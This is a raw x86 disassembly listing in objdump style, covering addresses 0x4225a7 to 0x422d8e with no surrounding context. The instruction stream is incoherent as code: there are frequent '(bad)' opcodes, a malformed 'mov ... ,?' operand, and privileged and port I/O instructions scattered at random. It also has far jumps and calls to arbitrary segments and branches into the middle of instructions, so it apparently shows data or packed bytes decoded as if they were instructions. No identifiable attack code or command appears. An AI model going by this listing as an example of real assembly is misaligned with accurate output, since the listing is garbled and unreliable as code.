  4225a7:	or     al,0xf4
  4225a9:	mov    BYTE PTR [eax-0x507752d9],ch
  4225af:	cmc    
  4225b0:	add    esi,edi
  4225b2:	mov    ds:0xddc392ff,al
  4225b7:	stos   DWORD PTR es:[edi],eax
  4225b8:	jle    0x422573
  4225ba:	dec    edi
  4225bb:	mov    eax,0x94a00c2b
  4225c0:	mov    dh,0x4f
  4225c2:	add    dl,BYTE PTR [eax-0xe1aeb69]
  4225c8:	sub    edi,ecx
  4225ca:	xor    ecx,ecx
  4225cc:	into   
  4225cd:	or     esp,DWORD PTR [ebp+ebp*2-0x362ad2cf]
  4225d4:	leave  
  4225d5:	pop    ss
  4225d6:	fdiv   st,st(4)
  4225d8:	arpl   WORD PTR [eax],sp
  4225da:	inc    edx
  4225db:	and    eax,0x3ea33f19
  4225e0:	add    al,0xcf
  4225e2:	enter  0xc707,0x59
  4225e6:	in     eax,dx
  4225e7:	xor    ah,BYTE PTR [edi+0x75c45e0d]
  4225ed:	or     DWORD PTR [edx-0x7c69538],edi
  4225f3:	inc    esi
  4225f4:	mov    cl,0xed
  4225f6:	clc    
  4225f7:	pop    ds
  4225f8:	pop    ss
  4225f9:	pop    edi
  4225fa:	sbb    cl,ah
  4225fc:	into   
  4225fd:	fmul   st,st(1)
  4225ff:	jbe    0x422661
  422601:	sub    BYTE PTR [ecx+0x4a],al
  422604:	les    esp,FWORD PTR [edi-0x1a]
  422607:	scas   al,BYTE PTR es:[edi]
  422608:	xor    bl,BYTE PTR ds:0xf56361d
  42260e:	retf   0x4192
  422611:	or     eax,0x67beeef1
  422616:	push   ss
  422617:	push   ebx
  422618:	inc    ebx
  422619:	shl    BYTE PTR [ebx+0x70],cl
  42261c:	or     DWORD PTR [ebp+0xbb7bd62],esi
  422622:	mov    ah,0x8e
  422624:	retf   0x2fa1
  422627:	xchg   edx,eax
  422628:	stc    
  422629:	push   ebx
  42262a:	dec    edi
  42262b:	arpl   WORD PTR [eax-0x5e],bx
  42262e:	add    BYTE PTR [edx-0x300eb0aa],bl
  422634:	stc    
  422635:	mov    esi,0x6f42b97f
  42263a:	loopne 0x422682
  42263c:	out    dx,al
  42263d:	jns    0x42265a
  42263f:	inc    edi
  422640:	mov    eax,ds:0x1e70001
  422645:	add    BYTE PTR [eax],al
  422647:	in     al,0x52
  422649:	push   ebx
  42264a:	dec    ebx
  42264b:	mov    al,ds:0xc242c54e
  422650:	mov    ebp,0xb8698b91
  422655:	sub    eax,0x1f5eb686
  42265a:	dec    eax
  42265b:	or     BYTE PTR [eax+0x9],0xdb
  42265f:	out    0xc3,al
  422661:	sbb    bl,cl
  422663:	pop    ax
  422665:	loop   0x4225f3
  422667:	pop    ecx
  422668:	inc    ebp
  422669:	xor    bh,BYTE PTR [edi+0x41]
  42266c:	sbb    eax,0xde13d9e8
  422671:	mov    al,cs:0xcab91955
  422677:	inc    ecx
  422678:	jno    0x422685
  42267a:	xchg   ebx,eax
  42267b:	test   eax,0x6317b217
  422680:	mov    ds:0xaed0dfda,al
  422685:	inc    ebp
  422686:	mov    ch,0x5
  422688:	aam    0x47
  42268a:	and    bh,BYTE PTR [ebp+0x35ddb87d]
  422690:	jl     0x422637
  422692:	sahf   
  422693:	dec    eax
  422694:	xchg   eax,edx
  422696:	addr16 test eax,0xcccec5f5
  42269c:	add    eax,edx
  42269e:	push   esi
  42269f:	or     DWORD PTR [ebp-0x6625494d],esi
  4226a5:	or     edx,DWORD PTR [edi]
  4226a7:	js     0x422648
  4226a9:	(bad)  
  4226aa:	sub    eax,0xf3830d31
  4226af:	mov    fs,WORD PTR [ebx+ebp*8]
  4226b2:	(bad)  
  4226b3:	bound  esp,QWORD PTR [esi-0x3e]
  4226b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226b7:	mov    edi,0x89b458b7
  4226bc:	xor    BYTE PTR [esi+ecx*2],bh
  4226bf:	fucompp 
  4226c1:	inc    ebp
  4226c2:	ins    BYTE PTR es:[edi],dx
  4226c3:	adc    esp,DWORD PTR [edx+0x506b32df]
  4226c9:	(bad)  
  4226ca:	daa    
  4226cb:	nop
  4226cc:	dec    esp
  4226cd:	push   es
  4226ce:	xchg   BYTE PTR [ebx-0x6fa71cf8],ch
  4226d4:	int3   
  4226d5:	cmp    DWORD PTR [ecx+0x30],ecx
  4226d8:	dec    edx
  4226d9:	into   
  4226da:	(bad)  
  4226de:	push   0xdfdd1c27
  4226e3:	das    
  4226e4:	jmp    0x422669
  4226e6:	stos   DWORD PTR es:[edi],eax
  4226e7:	adc    BYTE PTR [ecx],dh
  4226e9:	push   ecx
  4226ea:	pusha  
  4226eb:	mov    al,ds:0xb55e4bd8
  4226f0:	push   edx
  4226f1:	lods   eax,DWORD PTR ds:[esi]
  4226f2:	xchg   edi,eax
  4226f3:	loope  0x422691
  4226f5:	(bad)
  4226f9:	enter  0xaec4,0x95
  4226fd:	pop    eax
  4226fe:	jge    0x422737
  422700:	jmp    0x3cf9:0xc4e58da6
  422707:	stos   DWORD PTR es:[edi],eax
  422708:	mov    ch,BYTE PTR [ecx+edi*1]
  42270b:	jp     0x4226b6
  42270d:	aas    
  42270e:	sub    al,0x91
  422710:	add    DWORD PTR [eax+0x6],ebx
  422713:	out    0x9e,eax
  422715:	xlat   BYTE PTR ds:[ebx]
  422716:	rcl    DWORD PTR [ebp+0x6b],cl
  422719:	xchg   BYTE PTR [esi+esi*1],cl
  42271c:	retf   
  42271d:	push   eax
  42271e:	sbb    al,0xda
  422720:	cmp    DWORD PTR [ebx+0x4ff0fe52],edi
  422726:	(bad)  
  422727:	mov    BYTE PTR [ecx],0x8e
  42272a:	sub    esp,0x6
  42272d:	pop    ecx
  42272e:	loop   0x4226b1
  422730:	mov    DWORD PTR [ebp+0x2ed7af98],0xf6268ba7
  42273a:	lods   eax,DWORD PTR ds:[esi]
  42273b:	and    eax,0x6cc63b60
  422740:	inc    eax
  422741:	cmp    DWORD PTR ds:0x27fde5a4,0x8fe218a9
  42274b:	lods   eax,DWORD PTR ds:[esi]
  42274c:	pop    esi
  42274d:	adc    ebx,ebx
  42274f:	mov    ch,0xd3
  422751:	inc    ebp
  422752:	enter  0xe5a5,0xb7
  422756:	loopne 0x4226fd
  422758:	loop   0x42278a
  42275a:	aam    0xd2
  42275c:	cmp    BYTE PTR [edi],al
  42275e:	mov    ah,0x11
  422760:	pop    eax
  422761:	aaa    
  422762:	shld   DWORD PTR [ebx+0x51],ecx,0xea
  422767:	mov    dh,cl
  422769:	xor    dh,BYTE PTR [edx+edi*2]
  42276c:	pop    edx
  42276d:	pop    ds
  42276e:	pusha  
  42276f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422770:	cmp    DWORD PTR [eax],0x27
  422773:	std    
  422774:	test   bl,bh
  422776:	and    bl,BYTE PTR [ebx+0x75e95da7]
  42277c:	retf   
  42277d:	jle    0x422741
  42277f:	pop    es
  422780:	add    edx,DWORD PTR [esi+0x24d3369]
  422786:	cmp    eax,0xc8e52fad
  42278b:	adc    eax,0x93dc6a6a
  422790:	clc    
  422791:	pop    ebp
  422792:	outs   dx,DWORD PTR ds:[esi]
  422793:	cmp    ah,BYTE PTR [edi-0x13]
  422796:	addr16 clc 
  422798:	repnz push esi
  42279a:	stos   BYTE PTR es:[edi],al
  42279b:	dec    eax
  42279c:	lods   eax,DWORD PTR ds:[esi]
  42279d:	jnp    0x4227b6
  42279f:	lods   al,BYTE PTR ds:[esi]
  4227a0:	xchg   ebp,eax
  4227a1:	mov    dl,0xe9
  4227a3:	icebp  
  4227a4:	imul   edi,DWORD PTR [ebp+ecx*8-0x8d332a8],0xa5af0d22
  4227af:	pop    esi
  4227b0:	pop    ss
  4227b1:	and    al,0xdf
  4227b3:	cdq    
  4227b4:	adc    BYTE PTR [edi+eiz*8],0x2d
  4227b8:	mov    dl,0x4
  4227ba:	ds test edi,esp
  4227bd:	dec    edi
  4227be:	out    0x91,al
  4227c0:	pop    ebp
  4227c1:	adc    bh,al
  4227c3:	mov    ebx,0xc504b85f
  4227c8:	pop    ebx
  4227c9:	fmul   DWORD PTR [edi+0x39b34ca8]
  4227cf:	jge    0x422828
  4227d1:	sbb    al,0x5b
  4227d3:	and    DWORD PTR [esi],0x55
  4227d6:	dec    ebp
  4227d7:	lds    ebx,FWORD PTR [edx-0x7b]
  4227da:	sti    
  4227db:	jmp    0x422781
  4227dd:	xor    bl,BYTE PTR [ebx]
  4227df:	pop    edi
  4227e0:	push   edi
  4227e1:	sub    eax,0xf8edea2f
  4227e6:	frstor [ebx-0x69c3f4f5]
  4227ec:	call   0xbff9:0x81d789e3
  4227f3:	jl     0x4227a0
  4227f5:	lea    eax,[ebx+esi*2]
  4227f8:	loopne 0x4227be
  4227fa:	loop   0x4227e4
  4227fc:	push   es
  4227fd:	jp     0x422872
  4227ff:	and    al,0xdd
  422801:	sahf   
  422802:	jnp    0x422868
  422804:	es loopne 0x422803
  422807:	jp     0x422793
  422809:	popf   
  42280a:	aad    0xba
  42280c:	sub    BYTE PTR [edx+0x30f685e5],ch
  422812:	sbb    eax,0xf6c5b21
  422817:	jge    0x4227ec
  422819:	dec    esp
  42281a:	cmp    al,BYTE PTR [esi-0x43]
  42281d:	lds    ecx,FWORD PTR [esi-0x44]
  422820:	ins    BYTE PTR es:[edi],dx
  422821:	test   eax,0xa64b62c9
  422826:	push   ss
  422827:	adc    ah,BYTE PTR [ecx+0x3d30f7fc]
  42282d:	clc    
  42282e:	add    ah,bh
  422830:	xlat   BYTE PTR ds:[ebx]
  422831:	dec    esp
  422832:	call   0xd83f23a6
  422837:	loop   0x422880
  422839:	les    esi,FWORD PTR [eax-0x65]
  42283c:	pop    edx
  42283d:	sbb    BYTE PTR [esi+0x2e],dl
  422840:	mov    ds:0x1e70001,eax
  422845:	add    BYTE PTR [eax],al
  422847:	jecxz  0x42281a
  422849:	push   ecx
  42284a:	out    0xa6,eax
  42284c:	mov    dh,0xbc
  42284e:	sbb    ecx,edi
  422850:	frstor [edx-0x7450b026]
  422856:	mov    esp,0x44fcc424
  42285b:	dec    ebx
  42285c:	into   
  42285d:	add    dl,BYTE PTR [ecx+0x49f46ccb]
  422863:	xchg   DWORD PTR [ebp-0x47a59d9a],ecx
  422869:	cmp    al,0xde
  42286b:	mov    esp,0x11a1a128
  422870:	xchg   BYTE PTR [esi+0x4d8f9500],ch
  422876:	arpl   WORD PTR [esp+edi*1-0x3a],bp
  42287a:	stos   DWORD PTR es:[edi],eax
  42287b:	cmp    BYTE PTR [esi+0x3a00245c],dl
  422881:	pop    ds
  422882:	lock dec edx
  422884:	leave  
  422885:	mov    edx,0x5410803
  42288a:	test   BYTE PTR [eax-0x4a8ce59],dl
  422890:	push   esi
  422891:	dec    ebx
  422892:	sub    al,0xdf
  422894:	jb     0x4228be
  422896:	imul   esp,ebp,0xd
  422899:	add    eax,0x6b0a5d3f
  42289e:	shl    DWORD PTR [eax-0x5f],1
  4228a1:	test   al,0x8f
  4228a3:	add    BYTE PTR [ebx-0x3c90bf7a],0x40
  4228aa:	fs push edi
  4228ac:	mov    esp,0xc9cb4e1e
  4228b1:	fwait
  4228b2:	push   ds
  4228b3:	(bad)  
  4228b4:	cdq    
  4228b5:	lea    eax,[esi]
  4228b7:	fmul   DWORD PTR [ebx+0x5f]
  4228ba:	addr16 push esp
  4228bc:	adc    DWORD PTR [ebp+0x6a],ecx
  4228bf:	mov    ah,0xa1
  4228c1:	xor    ebx,DWORD PTR [esp+ebp*2-0x75]
  4228c5:	popf   
  4228c6:	sub    DWORD PTR [edi],0x6cc51520
  4228cc:	out    0xb9,al
  4228ce:	xchg   edx,eax
  4228cf:	sbb    eax,0x29dc05ab
  4228d4:	or     al,0xd8
  4228d6:	pop    ecx
  4228d7:	aaa    
  4228d8:	jns    0x4228e6
  4228da:	dec    edi
  4228db:	and    bl,BYTE PTR [eax+edx*2+0x381a4762]
  4228e2:	mov    eax,DWORD PTR [esi-0x2d0ec823]
  4228e8:	(bad)  
  4228e9:	sub    eax,0xd074d94a
  4228ee:	repnz das 
  4228f0:	lahf   
  4228f1:	cmp    eax,0xd71784e0
  4228f6:	call   0xe62a764a
  4228fb:	mov    esp,esi
  4228fd:	movhps QWORD PTR [ebx-0x1153be79],xmm7
  422904:	or     al,0xa
  422906:	jl     0x4228d3
  422908:	out    0x2c,al
  42290a:	repnz dec esi
  42290c:	inc    eax
  42290d:	sub    BYTE PTR [ebp-0x581fd39b],bh
  422913:	mov    ds:0x2d0536e3,al
  422918:	mov    ebp,0x24a704b5
  42291d:	lahf   
  42291e:	adc    BYTE PTR [ebp-0x33],ch
  422921:	jg     0x4228f1
  422923:	mov    ecx,0xa37af00c
  422928:	pop    esp
  422929:	push   es
  42292a:	add    ah,BYTE PTR [edi+0x4f]
  42292d:	xchg   ebx,eax
  42292e:	lahf   
  42292f:	xchg   ebp,eax
  422930:	icebp  
  422931:	retf   
  422932:	test   BYTE PTR [ecx-0x65e928ee],dl
  422938:	jecxz  0x422931
  42293a:	inc    edi
  42293b:	call   0x43464f19
  422940:	(bad)  
  422942:	ds icebp 
  422944:	add    ebp,DWORD PTR [esi-0x5a]
  422947:	cwde   
  422948:	cmovnp ecx,DWORD PTR ss:[ebx+0x2d]
  42294d:	sub    al,0x1b
  42294f:	pushf  
  422950:	xor    DWORD PTR [esi+0x4f],ebx
  422953:	inc    edx
  422954:	pop    ss
  422955:	adc    BYTE PTR [edx+0x3da7c5b1],dh
  42295b:	jbe    0x422951
  42295d:	cmc    
  42295e:	xlat   BYTE PTR ds:[ebx]
  42295f:	pop    ebx
  422960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422961:	stos   BYTE PTR es:[edi],al
  422962:	pop    ecx
  422963:	ins    DWORD PTR es:[edi],dx
  422964:	out    dx,eax
  422965:	push   ss
  422966:	cmp    bh,dh
  422968:	or     BYTE PTR [ecx-0xeb7a753],dl
  42296e:	mov    al,ds:0x4ed9689e
  422973:	int3   
  422974:	push   0x132b4cc
  422979:	sub    DWORD PTR [ecx+0x65e9238f],eax
  42297f:	sub    cl,ch
  422981:	das    
  422982:	jnp    0x4229b9
  422984:	stos   BYTE PTR es:[edi],al
  422985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422986:	jg     0x42291f
  422988:	pop    ds
  422989:	add    edi,edi
  42298b:	pop    edx
  42298c:	xchg   BYTE PTR [ecx+eax*4-0x4b18afb0],bl
  422993:	call   0x6cff:0x634d02e
  42299a:	mov    esp,0x8c30e186
  42299f:	dec    edx
  4229a0:	fisub  DWORD PTR [esi-0x10]
  4229a3:	sub    dh,BYTE PTR [eax-0x2e]
  4229a6:	add    ebp,ecx
  4229a8:	fimul  DWORD PTR [esi]
  4229aa:	enter  0xa017,0xf1
  4229ae:	jo     0x422961
  4229b0:	rcr    BYTE PTR [eax-0x6a],1
  4229b3:	pop    es
  4229b4:	add    esp,DWORD PTR [esi-0x2900722e]
  4229ba:	pushf  
  4229bb:	sub    DWORD PTR [edx-0x30],0xffffffbd
  4229bf:	jle    0x4229da
  4229c1:	dec    eax
  4229c2:	out    0x21,al
  4229c4:	add    BYTE PTR [edi],ah
  4229c6:	mov    esp,DWORD PTR [eax-0x62]
  4229c9:	popf   
  4229ca:	jno    0x422a36
  4229cc:	(bad)  
  4229cd:	and    ch,BYTE PTR cs:[ebx-0x13]
  4229d1:	rcr    ecx,1
  4229d3:	aam    0x8e
  4229d5:	es adc al,bh
  4229d8:	mov    esp,0x466114ef
  4229dd:	dec    eax
  4229de:	adc    DWORD PTR [esi-0x1d],edi
  4229e1:	jg     0x422a26
  4229e3:	push   cs
  4229e4:	and    DWORD PTR [ebp+0x5],eax
  4229e7:	popa   
  4229e8:	push   eax
  4229e9:	xchg   DWORD PTR [edx],ecx
  4229eb:	sbb    eax,DWORD PTR [eax]
  4229ed:	or     dl,BYTE PTR [eax]
  4229ef:	or     ah,BYTE PTR [edi+0x7bdbf411]
  4229f5:	jge    0x4229fc
  4229f7:	push   eax
  4229f8:	fmul   st,st(1)
  4229fa:	mov    edx,0xac92db7c
  4229ff:	push   cs
  422a00:	call   0xb6be2c1d
  422a05:	mov    ch,0x3b
  422a07:	jp     0x422a04
  422a09:	xor    DWORD PTR [ebx],edi
  422a0b:	pop    ds
  422a0c:	mov    WORD PTR [ecx],?
  422a0e:	mov    edx,0x663b1081
  422a13:	mov    ah,0xc4
  422a15:	lock stc 
  422a17:	imul   ecx,DWORD PTR [ecx+0x7123f999],0x7606098
  422a21:	push   eax
  422a22:	not    BYTE PTR [edi+edx*8-0x5c98d606]
  422a29:	test   eax,0xda8c9fab
  422a2e:	add    BYTE PTR [ecx-0x11],al
  422a31:	jnp    0x422a61
  422a33:	(bad)  
  422a34:	mov    esi,0x1864ef55
  422a39:	xlat   BYTE PTR ds:[ebx]
  422a3a:	punpckhdq mm7,mm3
  422a3d:	mov    esp,0x1a515c2
  422a42:	add    bh,ah
  422a44:	add    DWORD PTR [eax],eax
  422a46:	add    ch,dl
  422a48:	dec    edx
  422a49:	push   ecx
  422a4a:	fcomi  st,st(0)
  422a4c:	out    dx,al
  422a4d:	(bad)  
  422a4e:	iret   
  422a4f:	pop    eax
  422a50:	cwde   
  422a51:	std    
  422a52:	or     dh,cl
  422a54:	daa    
  422a55:	add    BYTE PTR [esi-0x1d],cl
  422a58:	mov    ebp,0x8fbf5626
  422a5d:	sbb    BYTE PTR [edi-0x3f],dl
  422a60:	fcom   DWORD PTR [ecx]
  422a62:	push   edx
  422a63:	lods   al,BYTE PTR ds:[esi]
  422a64:	mov    edi,0xabeaefb3
  422a69:	ins    DWORD PTR es:[edi],dx
  422a6a:	push   ss
  422a6b:	ins    BYTE PTR es:[edi],dx
  422a6c:	add    ecx,DWORD PTR [edi+edx*2-0x5d]
  422a70:	test   DWORD PTR [esi+eiz*4-0x5a],esi
  422a74:	mov    ch,0xcc
  422a76:	pop    esi
  422a77:	mov    esi,DWORD PTR [eax+0x62fc18d1]
  422a7d:	dec    esi
  422a7e:	mov    BYTE PTR [ebp+0x2a56905f],bh
  422a84:	inc    ecx
  422a85:	push   0x4
  422a87:	adc    BYTE PTR [edi+0x58],dl
  422a8a:	xchg   ebp,eax
  422a8b:	jns    0x422a79
  422a8d:	pop    esp
  422a8e:	sub    esi,DWORD PTR [ecx+0x2e]
  422a91:	clc    
  422a92:	loop   0x422a88
  422a94:	mov    edi,0xe802d035
  422a99:	lahf   
  422a9a:	(bad)  
  422a9b:	adc    edi,DWORD PTR [eax+0x49de0511]
  422aa1:	jb     0x422ad4
  422aa3:	sub    DWORD PTR [ebx-0x291346d7],ebx
  422aa9:	popa   
  422aaa:	xor    edx,eax
  422aac:	mov    edx,0xc9d68738
  422ab1:	nop
  422ab2:	jmp    0x422a93
  422ab4:	(bad)  
  422ab5:	into   
  422ab6:	imul   esi,DWORD PTR [ebx*4-0xdfdaff2],0x38
  422abe:	pusha  
  422abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ac0:	mov    bh,0xd2
  422ac2:	dec    eax
  422ac3:	pop    ebp
  422ac4:	gs or  eax,0xe60a3243
  422aca:	inc    edx
  422acb:	push   0xffffffe4
  422acd:	(bad)
  422ad1:	cmp    BYTE PTR [edx+ebx*1+0x345212cc],dl
  422ad8:	into   
  422ad9:	cmp    al,0x77
  422adb:	aaa    
  422adc:	dec    ebx
  422add:	loope  0x422b3d
  422adf:	or     BYTE PTR [eax+0x31],ah
  422ae2:	retf   0x49ac
  422ae5:	fnstcw WORD PTR [esi-0x4b]
  422ae8:	fidiv  WORD PTR [esi+0x76]
  422aeb:	aam    0xaf
  422aed:	push   cs
  422aee:	test   al,0xdc
  422af0:	mov    ds:0x99ae2785,al
  422af5:	pop    ds
  422af6:	push   edi
  422af7:	sbb    BYTE PTR [edx+0x7df9a8ab],dh
  422afd:	(bad)  
  422aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b00:	pop    ecx
  422b01:	and    BYTE PTR [edx-0x80],ch
  422b04:	ss clc 
  422b06:	inc    edx
  422b07:	(bad)  
  422b09:	(bad)  
  422b0a:	mov    ds:0xd2315ac8,al
  422b0f:	inc    ebx
  422b10:	add    DWORD PTR [ecx+0x73337e8c],esp
  422b16:	push   cs
  422b17:	sub    al,BYTE PTR [esi-0x6b]
  422b1a:	add    bl,BYTE PTR ds:0x14dbbaa9
  422b20:	lods   al,BYTE PTR ds:[esi]
  422b21:	loopne 0x422b24
  422b23:	xchg   esi,eax
  422b24:	dec    ebp
  422b25:	or     eax,0x233f4bb4
  422b2a:	popf   
  422b2b:	sub    esi,DWORD PTR [ecx+0x58]
  422b2e:	cmc    
  422b2f:	add    BYTE PTR [edx-0x63],ah
  422b32:	pop    edx
  422b33:	stos   BYTE PTR es:[edi],al
  422b34:	out    0xd3,al
  422b36:	dec    BYTE PTR [ebp-0x5b2bac92]
  422b3c:	repnz sub BYTE PTR ds:0x72f84b15,bh
  422b43:	mov    ecx,0x24f033c
  422b48:	iret   
  422b49:	(bad)  
  422b4a:	(bad)  
  422b4b:	aaa    
  422b4c:	ins    DWORD PTR es:[edi],dx
  422b4d:	mov    bh,0x6f
  422b4f:	repnz sub al,0xbc
  422b52:	push   ebx
  422b53:	inc    ecx
  422b54:	stos   BYTE PTR es:[edi],al
  422b55:	adc    edi,eax
  422b57:	mov    bh,0x91
  422b59:	mov    bh,0x8b
  422b5b:	gs push ebx
  422b5d:	ins    DWORD PTR es:[edi],dx
  422b5e:	pop    ds
  422b5f:	sub    eax,0x6b5747ca
  422b64:	or     bl,BYTE PTR [edi]
  422b66:	jge    0x422b8b
  422b68:	div    DWORD PTR [edi-0xabdb6aa]
  422b6e:	sub    cl,BYTE PTR [esi]
  422b70:	rol    BYTE PTR [ecx-0x3e],1
  422b73:	sub    eax,DWORD PTR ds:0x2780d76c
  422b79:	das    
  422b7a:	lahf   
  422b7b:	dec    esp
  422b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b7d:	leave  
  422b7e:	jae    0x422b30
  422b80:	out    0x2b,al
  422b82:	adc    DWORD PTR [ebx-0x5e8456dc],0x64
  422b89:	aas    
  422b8a:	mov    ch,BYTE PTR [esi+0x2bc3fa83]
  422b90:	adc    dl,dl
  422b92:	stos   DWORD PTR es:[edi],eax
  422b93:	dec    ebp
  422b94:	fld    TBYTE PTR [eax]
  422b96:	and    BYTE PTR [edx-0x3b],dl
  422b99:	scas   eax,DWORD PTR es:[edi]
  422b9a:	xor    esi,ebp
  422b9c:	aas    
  422b9d:	mov    edx,0x32192666
  422ba2:	test   eax,ebx
  422ba4:	sub    dh,BYTE PTR [edi-0x7720f1d2]
  422baa:	iret   
  422bab:	je     0x422c04
  422bad:	call   0xe235:0x3c3b936f
  422bb4:	mov    BYTE PTR [edx+0x18],bh
  422bb7:	arpl   WORD PTR [ebx+0x57a462fa],bx
  422bbd:	adc    DWORD PTR [edi],edi
  422bbf:	inc    esp
  422bc0:	fisub  DWORD PTR [ecx+0x3f3503bc]
  422bc6:	push   es
  422bc7:	(bad)  
  422bc8:	(bad)  
  422bca:	mov    eax,ds:0x18c3f031
  422bcf:	rcl    BYTE PTR [ebx+0x2aa41dfb],cl
  422bd5:	sbb    DWORD PTR [ebx-0x26],0xc
  422bd9:	adc    esi,esp
  422bdb:	mov    eax,ds:0x985fc9c5
  422be0:	daa    
  422be1:	push   ds
  422be2:	or     eax,0x3364e913
  422be7:	mov    esp,0x36b001e3
  422bec:	outs   dx,BYTE PTR ds:[esi]
  422bed:	xor    DWORD PTR [ebp-0x27],edx
  422bf0:	cmc    
  422bf1:	out    0x37,eax
  422bf3:	cmp    bl,BYTE PTR [edi]
  422bf5:	dec    ebp
  422bf6:	fisttp DWORD PTR [eax]
  422bf8:	adc    bl,0x15
  422bfb:	retf   
  422bfc:	dec    ebp
  422bfd:	jnp    0x422bd9
  422bff:	call   0xdbec7d4f
  422c04:	test   BYTE PTR [esi+ebp*4],cl
  422c07:	sub    ecx,DWORD PTR [ecx]
  422c09:	ds loope 0x422c28
  422c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c0d:	dec    eax
  422c0e:	gs je  0x422c3a
  422c11:	out    dx,al
  422c12:	es cld 
  422c14:	or     BYTE PTR [ebx+0x4e2bb7f4],bh
  422c1a:	inc    esi
  422c1b:	pop    eax
  422c1c:	dec    ecx
  422c1d:	jno    0x422c85
  422c1f:	mov    ecx,0x9d505041
  422c24:	shr    BYTE PTR [ebp+ecx*2+0x48d8ded9],cl
  422c2b:	clc    
  422c2c:	push   ss
  422c2d:	mov    ch,0x0
  422c2f:	adc    eax,0x7f7d7f79
  422c34:	jg     0x422c4d
  422c36:	jns    0x422c85
  422c38:	dec    edx
  422c39:	lea    ecx,[ebx+0x55]
  422c3c:	mov    eax,ds:0xa6fce66d
  422c41:	add    DWORD PTR [eax],eax
  422c43:	out    0x1,eax
  422c45:	add    BYTE PTR [eax],al
  422c47:	dec    ebx
  422c48:	(bad)  
  422c49:	xlat   BYTE PTR gs:[ebx]
  422c4b:	pop    ecx
  422c4c:	imul   edx,DWORD PTR [ebp+0xdc7a39d],0xffffffb0
  422c53:	or     eax,0xcc0f30e3
  422c59:	adc    DWORD PTR [esi+ebp*4],edx
  422c5c:	cmp    BYTE PTR [ebx],0xb0
  422c5f:	mov    esi,DWORD PTR [ecx+0x43a35f7c]
  422c65:	mov    dl,0xa
  422c67:	mov    ds:0x5bfb702c,al
  422c6c:	lods   eax,DWORD PTR ds:[esi]
  422c6d:	push   cs
  422c6e:	js     0x422c94
  422c70:	dec    edi
  422c71:	lods   eax,DWORD PTR ds:[esi]
  422c72:	or     ecx,DWORD PTR ds:0x90a77272
  422c78:	loope  0x422c2c
  422c7a:	mov    ebp,0xef622484
  422c7f:	fwait
  422c80:	adc    ch,BYTE PTR [ebx]
  422c82:	and    al,0x16
  422c84:	mov    WORD PTR [ebp-0x435cfff6],es
  422c8a:	mov    al,ds:0x6a67a209
  422c8f:	(bad)  
  422c91:	ret    0xb7c7
  422c94:	(bad)  
  422c95:	out    0x75,eax
  422c97:	pop    eax
  422c98:	mov    ecx,0x86ee5c7d
  422c9d:	je     0x422d0d
  422c9f:	pop    ebp
  422ca0:	cmp    eax,0xcf40cbb9
  422ca5:	(bad)  ds:0xb02b25b4
  422cab:	lfs    edx,FWORD PTR [edx]
  422cae:	xor    ebp,edi
  422cb0:	dec    ebx
  422cb1:	fadd   DWORD PTR [ebp+0xd]
  422cb4:	or     BYTE PTR ds:0xa8681e59,dl
  422cba:	push   es
  422cbb:	add    eax,0x2fde1034
  422cc0:	adc    esp,DWORD PTR [edi+0x40299ef2]
  422cc6:	int3   
  422cc7:	and    DWORD PTR [edi-0x5ba8ab01],edx
  422ccd:	xor    ebx,DWORD PTR [esi-0x5ff30a85]
  422cd3:	sbb    eax,0xc6251d5b
  422cd8:	push   esp
  422cd9:	cli    
  422cda:	sbb    eax,0xaf4c95ac
  422cdf:	fwait
  422ce0:	sbb    edi,DWORD PTR [esi]
  422ce2:	das    
  422ce3:	jmp    0x422cd6
  422ce5:	xchg   DWORD PTR [eax+0x50eb5185],esp
  422ceb:	lds    eax,FWORD PTR [edx]
  422ced:	pop    es
  422cee:	mov    WORD PTR [ecx-0x451c5e90],?
  422cf4:	test   eax,0x82837d14
  422cf9:	add    ch,BYTE PTR [eax+0x76]
  422cfc:	and    dl,BYTE PTR [ebp+ebp*8-0x4c]
  422d00:	cdq    
  422d01:	ret    
  422d02:	ffreep st(5)
  422d04:	rcl    bh,1
  422d06:	xchg   esi,eax
  422d07:	call   0x964c0a4e
  422d0c:	mov    al,ds:0xbd64cc2c
  422d11:	imul   edx,DWORD PTR [edx],0xffffffe7
  422d14:	and    DWORD PTR [edi],0x771363b0
  422d1a:	lds    edx,FWORD PTR [ebp+0x64]
  422d1d:	imul   eax,DWORD PTR [esi],0xe0383c80
  422d23:	loope  0x422d78
  422d25:	adc    al,dl
  422d27:	aaa    
  422d28:	adc    ah,dl
  422d2a:	in     al,dx
  422d2b:	xchg   esp,eax
  422d2c:	and    DWORD PTR [ebx-0xb],edx
  422d2f:	(bad)  
  422d30:	mov    esp,0x61a93a3d
  422d35:	push   edi
  422d36:	stos   BYTE PTR es:[edi],al
  422d37:	inc    edi
  422d38:	and    DWORD PTR [ebx-0x6a0dac8b],edx
  422d3e:	xor    BYTE PTR [eax+0x53],al
  422d41:	sbb    eax,0x30c68a94
  422d46:	xchg   esi,eax
  422d47:	sbb    esp,DWORD PTR [ecx+ebx*1-0x2b138cd3]
  422d4e:	leave  
  422d4f:	aam    0x7d
  422d51:	xchg   edi,eax
  422d52:	adc    eax,0x9d1a2719
  422d57:	sbb    bl,BYTE PTR [ecx]
  422d59:	add    esp,esi
  422d5b:	pop    ebx
  422d5c:	and    al,0xeb
  422d5e:	mov    ecx,ebx
  422d60:	xchg   BYTE PTR [esi+0x1a4a36d8],dh
  422d66:	jb     0x422db7
  422d68:	push   ebx
  422d69:	stos   BYTE PTR es:[edi],al
  422d6a:	jle    0x422d95
  422d6c:	(bad)  
  422d6d:	repnz clc 
  422d6f:	(bad)  
  422d70:	popa   
  422d71:	inc    eax
  422d72:	xchg   DWORD PTR [ecx-0x4d],ebx
  422d75:	add    edx,ebx
  422d77:	scas   al,BYTE PTR es:[edi]
  422d78:	sbb    DWORD PTR [ebx],eax
  422d7a:	push   0xffffff96
  422d7c:	mov    ebp,0x44c29f77
  422d81:	mov    cs,esp
  422d83:	xchg   esi,eax
  422d84:	add    BYTE PTR [esi-0xd6cff8e],cl
  422d8a:	or     al,0x7e
  422d8c:	adc    BYTE PTR [edi],bl
  422d8e:	scas   al,BYTE PTR es:[edi]
